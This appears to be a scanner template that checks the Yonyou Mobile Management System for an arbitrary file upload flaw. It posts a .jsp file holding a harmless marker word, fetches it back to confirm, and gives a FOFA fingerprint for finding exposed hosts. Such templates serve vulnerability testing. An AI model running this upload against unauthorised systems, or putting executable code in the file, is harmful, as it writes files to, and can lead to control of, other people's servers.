id: yongyou-mobile-manager-system-uploadapk-upload
info:
  name: 用友移动管理系统uploadApk.dopk_obj存在任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 用友 移动管理系统
  fofa: body="../js/jslib/jquery.blockUI.js"
variables:
  filename: to_lower(random_str(6))
requests:
- method: POST
  path: /maportal/appmanager/uploadApk.dopk_obj=
  headers:
    Content-Type: multipart/form-data; boundary=fa48ebfef59b133a8cd5275661b35d2c
  data: '--fa48ebfef59b133a8cd5275661b35d2c

    Content-Disposition: form-data; name="downloadpath"; filename="{{.filename}}.jsp"

    Content-Type: application/msword


    vulnerability

    --fa48ebfef59b133a8cd5275661b35d2c--

    '
  expression: "status_code == 200 && \ncontains(body,\"{\\\"status\\\":2}\")\n"
- method: GET
  path: /maupload/apk/{{.filename}}.jsp
  expression: "status_code == 200 && \ncontains(body,\"vulnerability\")\n"
transport: http
